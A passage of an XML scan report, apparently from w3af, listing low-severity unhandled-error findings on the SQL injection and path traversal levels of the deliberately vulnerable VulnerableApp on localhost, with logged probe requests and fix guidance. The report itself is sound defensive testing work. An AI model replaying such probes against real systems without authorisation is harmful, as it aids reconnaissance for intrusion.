    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="359">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3?id=2%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:36 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="23" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="647">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3?id=K9n5iYEg HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:40 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="652">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_3?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:40 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[3327, 3613, 3616]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="3327">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5?id=3%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:04 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="132" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZSwgImNhckluZm9ybWF0aW9uIjp7ImlkIjozLCJuYW1lIjoiTWVyY2VkZXMtQmVueiIsImltYWdlUGF0aCI6Ii9WdWxuZXJhYmxlQXBwL2ltYWdlcy9jYXJzL01lcmNlZGVzLUJlbnouanBnIn19</body>
    </http-response>

</http-transaction>
            <http-transaction id="3613">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5?id=CejtPCyP HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:15 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="24" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2V9</body>
    </http-response>

</http-transaction>
            <http-transaction id="3616">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_5?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:15 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="24" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[7988, 8046, 8095]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_1" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="7988">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_1?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:26 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8046">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_1?fileName=ynNi0tYq HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:28 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8095">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_1?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:29 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[8103, 8303, 8340]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_2" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="8103">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_2?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:29 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8303">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_2?fileName=z7mE4ASa HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:31 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8340">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_2?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:31 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[8270, 8488, 8505]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_3" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="8270">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_3?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:31 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8488">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_3?fileName=B6zfhycq HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:33 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8505">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_3?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:33 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[8517, 8731, 8762]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_4" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="8517">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_4?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:33 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8731">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_4?fileName=UCFgAG6E HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8762">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_4?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[8721, 8935, 8963]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_5" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="8721">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_5?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8935">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_5?fileName=FtboGZ3k HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="8963">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_5?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiT3dhc3BBcHBJbmZvLmpzb25zZWNyZXQuanNvblVzZXJJbmZvLmpzb24iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[8914, 9148, 9174]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/PathTraversal/LEVEL_6" var="fileName">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/PathTraversal/LEVEL_6&quot;, using HTTP method GET. The sent data was: &quot;fileName=&quot; The modified parameter was &quot;fileName&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="8914">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_6?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="9148">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_6?fileName=sxPkauRS HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:40 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="9174">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_6?fileName= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:09:40 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
